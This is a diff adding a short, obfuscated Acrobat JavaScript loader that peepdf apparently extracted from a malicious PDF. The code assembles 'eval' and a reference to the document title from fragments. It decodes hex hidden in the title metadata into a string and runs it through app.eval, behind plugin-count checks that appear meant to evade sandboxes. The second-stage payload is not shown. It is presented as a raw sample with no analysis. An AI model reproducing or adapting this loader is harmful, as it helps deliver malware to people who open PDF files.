@@ -1,0 +1,30 @@
+// peepdf comment: Javascript code located in object 5 (version 0)
+
+var SSS = null;
+var SS = "ev";
+var $S = "";
+$5 = "in";
+app.doc.syncAnnotScan();
+S$ = "ti";
+if (app.plugIns.length != 0) {
+    var $$ = 0;
+    S$ += "tl";
+    $5 += "fo";
+    ____SSS = app.doc.getAnnots({
+        nPage: 0
+    });
+    S$ += "e";
+    $S = this.info.title;
+}
+var S5 = "";
+if (app.plugIns.length > 3) {
+    SS += "a";
+    var arr = $S.split(/U_155bf62c9aU_7917ab39/);
+    for (var $ = 1; $ < arr.length; $++) {
+        S5 += String.fromCharCode("0x" + arr[$]);
+    }
+    SS += "l";
+}
+if (app.plugIns.length >= 2) {
+    app[SS](S5);
+}
